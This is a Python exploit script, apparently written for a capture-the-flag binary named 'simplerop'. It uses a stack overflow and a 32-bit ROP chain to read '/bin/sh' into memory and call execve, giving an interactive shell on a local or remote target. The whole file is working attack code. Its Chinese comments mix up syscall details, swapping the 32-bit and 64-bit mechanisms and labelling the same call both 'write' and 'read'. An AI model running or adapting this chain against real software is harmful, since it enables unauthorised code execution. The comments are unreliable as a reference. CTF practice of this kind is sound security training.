import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os


set_config(GameBoxConfig(
    is_local=True,
    file='./simplerop',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

pause()
read_addr = 0x0806CD50
binsh_addr = 0x080EB564

canary = b''


def exp():
    # overflow position
    data = [b'a' * (136),fakeebp()]
    return data


# 如果是64位
# 寄存器：rax rbx rcx rdx 
# 系统调用  int80(3) === write
#          int80(11) === execve
# 如果是32位
# eax ebx ecx edx
# 系统调用 syscall(0) === write
#          syscall(59) === execve

payload = exp()
# read(0,binsh,8)
# payload += [read_addr] # 题目有read则直接用
payload += [elf.rop['eax'], 3]  # 没有的话则用int80(3)===read调用
payload += [elf.rop['edx_ecx_ebx'], 8, binsh_addr, 0]
payload += [elf.rop['int_80']]


# int11 -> execve(binsh,0,0)
payload += [elf.rop['eax'], constants.SYS_execve]
payload += [elf.rop['edx_ecx_ebx'], 0, 0, binsh_addr]
payload += [elf.rop['int_80']]


sl(payload)
sl(b'/bin/sh\x00')

interactive()
